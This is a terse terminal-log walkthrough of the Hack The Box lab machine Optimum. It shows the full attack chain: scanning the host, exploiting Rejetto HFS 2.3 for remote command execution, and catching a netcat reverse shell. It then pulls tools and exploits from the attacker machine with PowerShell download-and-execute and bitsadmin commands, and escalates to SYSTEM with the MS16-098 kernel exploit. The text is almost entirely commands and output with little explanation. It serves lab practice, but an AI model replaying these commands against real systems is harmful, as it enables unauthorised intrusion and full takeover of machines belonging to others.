root@kali:~/htb/beep# nmap -sC -sV -p- -vv -oA full 10.10.10.8
PORT   STATE SERVICE REASON          VERSION
80/tcp open  http    syn-ack ttl 127 HttpFileServer httpd 2.3
|_http-favicon: Unknown favicon MD5: 759792EDD4EF8E6BC2D1877D27153CB1
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: HFS 2.3
|_http-title: HFS /
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

WEB ENUM
http://10.10.10.8/
Server information
HttpFileServer 2.3
Server time: 11/11/2020 7:40:11 πμ
Server uptime: 00:08:57 

SEARCH FOR EXPLOIT
root@kali:~/htb/optimum# searchsploit rejetto 2.3
------------------------------------------------------- ----------------------------------------
 Exploit Title                                         |  Path
                                                       | (/usr/share/exploitdb/)
------------------------------------------------------- ----------------------------------------
Rejetto HTTP File Server (HFS) 2.2/2.3 - Arbitrary Fil | exploits/multiple/remote/30850.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command  | exploits/windows/remote/34668.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command  | exploits/windows/remote/39161.py
Rejetto HTTP File Server (HFS) 2.3a/2.3b/2.3c - Remote | exploits/windows/webapps/34852.txt
------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
root@kali:~/htb/optimum# locate 39161.py
/usr/share/exploitdb/exploits/windows/remote/39161.py

EXPLOIT
EDIT PYTHON SCRIPT
root@kali:~/htb/optimum# cp /usr/share/exploitdb/exploits/windows/remote/39161.py .
root@kali:~/htb/optimum# vim 39161.py 
CHANGE LOCAL IP AND LISTENER ADDRESS

COPY NETCAT TO DIRECTORY ACCESSIBLE BY WEB HTTP
root@kali:~/htb/optimum# locate nc.exe
/usr/share/windows-binaries/nc.exe
root@kali:~/htb/optimum# cp /usr/share/windows-binaries/nc.exe .
root@kali:~/htb/optimum# cp nc.exe nc

root@kali:~/htb/optimum# python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
10.10.10.8 - - [04/Nov/2020 15:46:45] "GET /nc.exe HTTP/1.1" 200 -
10.10.10.8 - - [04/Nov/2020 15:46:45] "GET /nc.exe HTTP/1.1" 200 -
10.10.10.8 - - [04/Nov/2020 15:46:45] "GET /nc.exe HTTP/1.1" 200 -
10.10.10.8 - - [04/Nov/2020 15:46:45] "GET /nc.exe HTTP/1.1" 200 -

RUN PYTHON SCRIPT
root@kali:~/htb/optimum# python 39161.py 10.10.10.8 80


GET LOW PRIV SHELL WITH USER KOSTAS
root@kali:~/htb/optimum# nc -lvp 443
listening on [any] 443 ...
10.10.10.8: inverse host lookup failed: Unknown host
connect to [10.10.14.8] from (UNKNOWN) [10.10.10.8] 49202
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\kostas\Desktop>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled

C:\Users\kostas\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is D0BC-0196

 Directory of C:\Users\kostas\Desktop

11/11/2020  07:32 ��    <DIR>          .
11/11/2020  07:32 ��    <DIR>          ..
18/03/2017  02:11 ��           760.320 hfs.exe
18/03/2017  02:13 ��                32 user.txt.txt
               2 File(s)        760.352 bytes
               2 Dir(s)  31.899.926.528 bytes free

GET USER FLAG
C:\Users\kostas\Desktop>type user.txt.txt
type user.txt.txt
#####################################


PRIVESC
bitsadmin /transfer enum http://10.10.14.8/winPEAS.exe C:\Users\kostas\AppData\Local\Temp\winPEAS.exe
bitsadmin /transfer enum /download /priority normal http://10.10.14.8/winPEAS.exe C:\Users\kostas\AppData\Local\Temp\winPEAS.exe
powershell.exe IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.8/winPEAS.exe')
powershell -c (new-object System.Net.WebClient).DownloadFile('http://10.10.14.8/winPEAS.exe','C:\Users\kostas\AppData\Local\Temp\winPEAS.exe')
powershell -c (new-object System.Net.WebClient).DownloadFile('http://10.10.14.8/41020.exe','C:\Users\kostas\AppData\Local\Temp\41020.exe')
powershell -c (new-object System.Net.WebClient).DownloadFile('http://10.10.14.8/jaws-enum.ps1','C:\Users\kostas\AppData\Local\Temp\jaws-enum.ps1')
windows-exploit-suggester.py
windows-privesc-check2.exe

GET SYSTEMINFO
:\Users\kostas\Desktop>systeminfo
systeminfo

Host Name:                 OPTIMUM
OS Name:                   Microsoft Windows Server 2012 R2 Standard
OS Version:                6.3.9600 N/A Build 9600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00252-70000-00000-AA535
Original Install Date:     18/3/2017, 1:51:36 ��
System Boot Time:          11/11/2020, 7:30:44 ��
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest
Total Physical Memory:     4.095 MB
Available Physical Memory: 3.377 MB
Virtual Memory: Max Size:  5.503 MB
Virtual Memory: Available: 4.797 MB
Virtual Memory: In Use:    706 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              \\OPTIMUM
Hotfix(s):                 31 Hotfix(s) Installed.
                           [01]: KB2959936
                           [02]: KB2896496
                           [03]: KB2919355
                           [04]: KB2920189
                           [05]: KB2928120
                           [06]: KB2931358
                           [07]: KB2931366
                           [08]: KB2933826
                           [09]: KB2938772
                           [10]: KB2949621
                           [11]: KB2954879
                           [12]: KB2958262
                           [13]: KB2958263
                           [14]: KB2961072
                           [15]: KB2965500
                           [16]: KB2966407
                           [17]: KB2967917
                           [18]: KB2971203
                           [19]: KB2971850
                           [20]: KB2973351
                           [21]: KB2973448
                           [22]: KB2975061
                           [23]: KB2976627
                           [24]: KB2977629
                           [25]: KB2981580
                           [26]: KB2987107
                           [27]: KB2989647
                           [28]: KB2998527
                           [29]: KB3000850
                           [30]: KB3003057
                           [31]: KB3014442
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) 82574L Gigabit Network Connection
                                 Connection Name: Ethernet0
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.8
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.

WINPEAS
C:\Users\kostas\AppData\Local\Temp>dir 
dir
 Volume in drive C has no label.
 Volume Serial Number is D0BC-0196

 Directory of C:\Users\kostas\AppData\Local\Temp

11/11/2020  08:29 ��    <DIR>          .
11/11/2020  08:29 ��    <DIR>          ..
18/03/2017  01:57 ��    <DIR>          Low
11/11/2020  08:29 ��           472.064 winPEAS.exe
               1 File(s)        472.064 bytes
               3 Dir(s)  31.898.894.336 bytes free


  

USE WINDOWS EXPLOIT SUGGESTER
root@kali:~# git clone https://github.com/AonCyberLabs/Windows-Exploit-Suggester.git
Cloning into 'Windows-Exploit-Suggester'...
remote: Enumerating objects: 120, done.
remote: Total 120 (delta 0), reused 0 (delta 0), pack-reused 120
Receiving objects: 100% (120/120), 169.26 KiB | 340.00 KiB/s, done.
Resolving deltas: 100% (72/72), done.
root@kali:~# cd Windows-Exploit-Suggester/
root@kali:~/Windows-Exploit-Suggester# ./Windows-exploit-suggester.py --update
bash: ./Windows-exploit-suggester.py: No such file or directory
root@kali:~/Windows-Exploit-Suggester# ./windows-exploit-suggester.py --update
[*] initiating winsploit version 3.3...
[+] writing to file 2020-11-04-mssb.xls
[*] done

root@kali:~/Windows-Exploit-Suggester# pip install xlrd --upgrade
Collecting xlrd
  Downloading https://files.pythonhosted.org/packages/b0/16/63576a1a001752e34bf8ea62e367997530dc553b689356b9879339cf45a4/xlrd-1.2.0-py2.py3-none-any.whl (103kB)
    100% |████████████████████████████████| 112kB 1.6MB/s 
Installing collected packages: xlrd
Successfully installed xlrd-1.2.0
root@kali:~/Windows-Exploit-Suggester# python windows-exploit-suggester.py --database 2020-11-04-mssb.xls --systeminfo /root/htb/optimum/systeminfo.txt 
[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension
[*] attempting to read from the systeminfo input file
[+] systeminfo input file read successfully (utf-8)
[*] querying database file for potential vulnerabilities
[*] comparing the 32 hotfix(es) against the 266 potential bulletins(s) with a database of 137 known exploits
[*] there are now 246 remaining vulns
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+] windows version identified as 'Windows 2012 R2 64-bit'
[*] 
[E] MS16-135: Security Update for Windows Kernel-Mode Drivers (3199135) - Important
[*]   https://www.exploit-db.com/exploits/40745/ -- Microsoft Windows Kernel - win32k Denial of Service (MS16-135)
[*]   https://www.exploit-db.com/exploits/41015/ -- Microsoft Windows Kernel - 'win32k.sys' 'NtSetWindowLongPtr' Privilege Escalation (MS16-135) (2)
[*]   https://github.com/tinysec/public/tree/master/CVE-2016-7255
[*] 
[E] MS16-098: Security Update for Windows Kernel-Mode Drivers (3178466) - Important
[*]   https://www.exploit-db.com/exploits/41020/ -- Microsoft Windows 8.1 (x64) - RGNOBJ Integer Overflow (MS16-098)
[*] 
[M] MS16-075: Security Update for Windows SMB Server (3164038) - Important
[*]   https://github.com/foxglovesec/RottenPotato
[*]   https://github.com/Kevin-Robertson/Tater
[*]   https://bugs.chromium.org/p/project-zero/issues/detail?id=222 -- Windows: Local WebDAV NTLM Reflection Elevation of Privilege
[*]   https://foxglovesecurity.com/2016/01/16/hot-potato/ -- Hot Potato - Windows Privilege Escalation
[*] 
[E] MS16-074: Security Update for Microsoft Graphics Component (3164036) - Important
[*]   https://www.exploit-db.com/exploits/39990/ -- Windows - gdi32.dll Multiple DIB-Related EMF Record Handlers Heap-Based Out-of-Bounds Reads/Memory Disclosure (MS16-074), PoC
[*]   https://www.exploit-db.com/exploits/39991/ -- Windows Kernel - ATMFD.DLL NamedEscape 0x250C Pool Corruption (MS16-074), PoC
[*] 
[E] MS16-063: Cumulative Security Update for Internet Explorer (3163649) - Critical
[*]   https://www.exploit-db.com/exploits/39994/ -- Internet Explorer 11 - Garbage Collector Attribute Type Confusion (MS16-063), PoC
[*] 
[E] MS16-032: Security Update for Secondary Logon to Address Elevation of Privile (3143141) - Important
[*]   https://www.exploit-db.com/exploits/40107/ -- MS16-032 Secondary Logon Handle Privilege Escalation, MSF
[*]   https://www.exploit-db.com/exploits/39574/ -- Microsoft Windows 8.1/10 - Secondary Logon Standard Handles Missing Sanitization Privilege Escalation (MS16-032), PoC
[*]   https://www.exploit-db.com/exploits/39719/ -- Microsoft Windows 7-10 & Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (PowerShell), PoC
[*]   https://www.exploit-db.com/exploits/39809/ -- Microsoft Windows 7-10 & Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (C#)
[*] 
[M] MS16-016: Security Update for WebDAV to Address Elevation of Privilege (3136041) - Important
[*]   https://www.exploit-db.com/exploits/40085/ -- MS16-016 mrxdav.sys WebDav Local Privilege Escalation, MSF
[*]   https://www.exploit-db.com/exploits/39788/ -- Microsoft Windows 7 - WebDAV Privilege Escalation Exploit (MS16-016) (2), PoC
[*]   https://www.exploit-db.com/exploits/39432/ -- Microsoft Windows 7 SP1 x86 - WebDAV Privilege Escalation (MS16-016) (1), PoC
[*] 
[E] MS16-014: Security Update for Microsoft Windows to Address Remote Code Execution (3134228) - Important
[*]   Windows 7 SP1 x86 - Privilege Escalation (MS16-014), https://www.exploit-db.com/exploits/40039/, PoC
[*] 
[E] MS16-007: Security Update for Microsoft Windows to Address Remote Code Execution (3124901) - Important
[*]   https://www.exploit-db.com/exploits/39232/ -- Microsoft Windows devenum.dll!DeviceMoniker::Load() - Heap Corruption Buffer Underflow (MS16-007), PoC
[*]   https://www.exploit-db.com/exploits/39233/ -- Microsoft Office / COM Object DLL Planting with WMALFXGFXDSP.dll (MS-16-007), PoC
[*] 
[E] MS15-132: Security Update for Microsoft Windows to Address Remote Code Execution (3116162) - Important
[*]   https://www.exploit-db.com/exploits/38968/ -- Microsoft Office / COM Object DLL Planting with comsvcs.dll Delay Load of mqrt.dll (MS15-132), PoC
[*]   https://www.exploit-db.com/exploits/38918/ -- Microsoft Office / COM Object els.dll DLL Planting (MS15-134), PoC
[*] 
[E] MS15-112: Cumulative Security Update for Internet Explorer (3104517) - Critical
[*]   https://www.exploit-db.com/exploits/39698/ -- Internet Explorer 9/10/11 - CDOMStringDataList::InitFromString Out-of-Bounds Read (MS15-112)
[*] 
[E] MS15-111: Security Update for Windows Kernel to Address Elevation of Privilege (3096447) - Important
[*]   https://www.exploit-db.com/exploits/38474/ -- Windows 10 Sandboxed Mount Reparse Point Creation Mitigation Bypass (MS15-111), PoC
[*] 
[E] MS15-102: Vulnerabilities in Windows Task Management Could Allow Elevation of Privilege (3089657) - Important
[*]   https://www.exploit-db.com/exploits/38202/ -- Windows CreateObjectTask SettingsSyncDiagnostics Privilege Escalation, PoC
[*]   https://www.exploit-db.com/exploits/38200/ -- Windows Task Scheduler DeleteExpiredTaskAfter File Deletion Privilege Escalation, PoC
[*]   https://www.exploit-db.com/exploits/38201/ -- Windows CreateObjectTask TileUserBroker Privilege Escalation, PoC
[*] 
[E] MS15-097: Vulnerabilities in Microsoft Graphics Component Could Allow Remote Code Execution (3089656) - Critical
[*]   https://www.exploit-db.com/exploits/38198/ -- Windows 10 Build 10130 - User Mode Font Driver Thread Permissions Privilege Escalation, PoC
[*]   https://www.exploit-db.com/exploits/38199/ -- Windows NtUserGetClipboardAccessToken Token Leak, PoC
[*] 
[M] MS15-078: Vulnerability in Microsoft Font Driver Could Allow Remote Code Execution (3079904) - Critical
[*]   https://www.exploit-db.com/exploits/38222/ -- MS15-078 Microsoft Windows Font Driver Buffer Overflow
[*] 
[E] MS15-052: Vulnerability in Windows Kernel Could Allow Security Feature Bypass (3050514) - Important
[*]   https://www.exploit-db.com/exploits/37052/ -- Windows - CNG.SYS Kernel Security Feature Bypass PoC (MS15-052), PoC
[*] 
[M] MS15-051: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (3057191) - Important
[*]   https://github.com/hfiref0x/CVE-2015-1701, Win32k Elevation of Privilege Vulnerability, PoC
[*]   https://www.exploit-db.com/exploits/37367/ -- Windows ClientCopyImage Win32k Exploit, MSF
[*] 
[E] MS15-010: Vulnerabilities in Windows Kernel-Mode Driver Could Allow Remote Code Execution (3036220) - Critical
[*]   https://www.exploit-db.com/exploits/39035/ -- Microsoft Windows 8.1 - win32k Local Privilege Escalation (MS15-010), PoC
[*]   https://www.exploit-db.com/exploits/37098/ -- Microsoft Windows - Local Privilege Escalation (MS15-010), PoC
[*]   https://www.exploit-db.com/exploits/39035/ -- Microsoft Windows win32k Local Privilege Escalation (MS15-010), PoC
[*] 
[E] MS15-001: Vulnerability in Windows Application Compatibility Cache Could Allow Elevation of Privilege (3023266) - Important
[*]   http://www.exploit-db.com/exploits/35661/ -- Windows 8.1 (32/64 bit) - Privilege Escalation (ahcache.sys/NtApphelpCacheControl), PoC
[*] 
[E] MS14-068: Vulnerability in Kerberos Could Allow Elevation of Privilege (3011780) - Critical
[*]   http://www.exploit-db.com/exploits/35474/ -- Windows Kerberos - Elevation of Privilege (MS14-068), PoC
[*] 
[M] MS14-064: Vulnerabilities in Windows OLE Could Allow Remote Code Execution (3011443) - Critical
[*]   https://www.exploit-db.com/exploits/37800// -- Microsoft Windows HTA (HTML Application) - Remote Code Execution (MS14-064), PoC
[*]   http://www.exploit-db.com/exploits/35308/ -- Internet Explorer OLE Pre-IE11 - Automation Array Remote Code Execution / Powershell VirtualAlloc (MS14-064), PoC
[*]   http://www.exploit-db.com/exploits/35229/ -- Internet Explorer <= 11 - OLE Automation Array Remote Code Execution (#1), PoC
[*]   http://www.exploit-db.com/exploits/35230/ -- Internet Explorer < 11 - OLE Automation Array Remote Code Execution (MSF), MSF
[*]   http://www.exploit-db.com/exploits/35235/ -- MS14-064 Microsoft Windows OLE Package Manager Code Execution Through Python, MSF
[*]   http://www.exploit-db.com/exploits/35236/ -- MS14-064 Microsoft Windows OLE Package Manager Code Execution, MSF
[*] 
[M] MS14-060: Vulnerability in Windows OLE Could Allow Remote Code Execution (3000869) - Important
[*]   http://www.exploit-db.com/exploits/35055/ -- Windows OLE - Remote Code Execution 'Sandworm' Exploit (MS14-060), PoC
[*]   http://www.exploit-db.com/exploits/35020/ -- MS14-060 Microsoft Windows OLE Package Manager Code Execution, MSF
[*] 
[M] MS14-058: Vulnerabilities in Kernel-Mode Driver Could Allow Remote Code Execution (3000061) - Critical
[*]   http://www.exploit-db.com/exploits/35101/ -- Windows TrackPopupMenu Win32k NULL Pointer Dereference, MSF
[*] 
[E] MS13-101: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (2880430) - Important
[M] MS13-090: Cumulative Security Update of ActiveX Kill Bits (2900986) - Critical
[*] done


USE THIS EXPLOIT
 MS16-098: Security Update for Windows Kernel-Mode Drivers (3178466) - 
root@kali:~/htb/optimum# wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/41020.exe

TRANSFER
C:\Users\kostas\AppData\Local\Temp>powershell -c (new-object System.Net.WebClient).DownloadFile('http://10.10.14.8/41020.exe','C:\Users\kostas\AppData\Local\Temp\41020.exe')
powershell -c (new-object System.Net.WebClient).DownloadFile('http://10.10.14.8/41020.exe','C:\Users\kostas\AppData\Local\Temp\41020.exe')

C:\Users\kostas\AppData\Local\Temp>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is D0BC-0196

 Directory of C:\Users\kostas\AppData\Local\Temp

11/11/2020  10:01 ��    <DIR>          .
11/11/2020  10:01 ��    <DIR>          ..
11/11/2020  10:01 ��           560.128 41020.exe
11/11/2020  09:33 ��            16.974 jaws-enum.ps1
18/03/2017  01:57 ��    <DIR>          Low
11/11/2020  08:47 ��            69.175 windows-exploit-suggester.py
11/11/2020  08:52 ��         7.484.886 windows-privesc-check2.exe
11/11/2020  08:29 ��           472.064 winPEAS.exe
               5 File(s)      8.603.227 bytes
               3 Dir(s)  31.889.186.816 bytes free

RUN EXPLOIT
C:\Users\kostas\AppData\Local\Temp>41020.exe
41020.exe
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\kostas\AppData\Local\Temp>whoami
whoami
nt authority\system


C:\Users\kostas\AppData\Local\Temp>dir C:\Users\Administrator\Desktop
dir C:\Users\Administrator\Desktop
 Volume in drive C has no label.
 Volume Serial Number is D0BC-0196

 Directory of C:\Users\Administrator\Desktop

18/03/2017  02:14 ��    <DIR>          .
18/03/2017  02:14 ��    <DIR>          ..
18/03/2017  02:14 ��                32 root.txt
               1 File(s)             32 bytes
               2 Dir(s)  31.889.186.816 bytes free

GET ROOT FLAG
C:\Users\kostas\AppData\Local\Temp>type C:\Users\Administrator\Desktop\root.txt
type C:\Users\Administrator\Desktop\root.txt
######################################

